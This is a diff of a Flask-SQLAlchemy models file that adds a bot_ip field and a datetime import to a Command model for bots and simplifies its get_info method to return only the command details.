@@ -1,4 +1,6 @@
 from flask_sqlalchemy import SQLAlchemy
+from datetime import datetime  
+
 db = SQLAlchemy()
 
 class Bot(db.Model):
@@ -48,10 +50,11 @@ class Bot(db.Model):
 class Command(db.Model):
     id = db.Column('cmd_id', db.Integer, primary_key=True)
     cmd = db.Column(db.String(128))
-    result = db.Column(db.String(500))
     bot_id = db.Column(db.Integer, db.ForeignKey('bot.bot_id'))
+    bot_ip = db.Column(db.String(128))
     timestamp = db.Column(db.String(50)) 
     latest = db.Column(db.Boolean, default=False)
+    result = db.Column(db.String(500))
 
     def __init__(self, cmd, bot_id, bot_ip):
         self.cmd = cmd 
@@ -59,6 +62,7 @@ class Command(db.Model):
         self.bot_ip = bot_ip 
         self.timestamp = str(datetime.now())
         self.latest = False
+        self.result = ''
 
     def set_latest_true(self):
         self.latest = True
@@ -71,6 +75,7 @@ class Command(db.Model):
 
     def get_info(self):
         info = '[Command Info] [' + self.timestamp + '] Bot_id: ' + str(self.bot_id) + ' Command Issued: ' + self.cmd
-        result = self.result 
+        #result = self.result 
 
-        return '\n'.join([info, result])
+        return info 
+        #return '\n'.join([info, result])
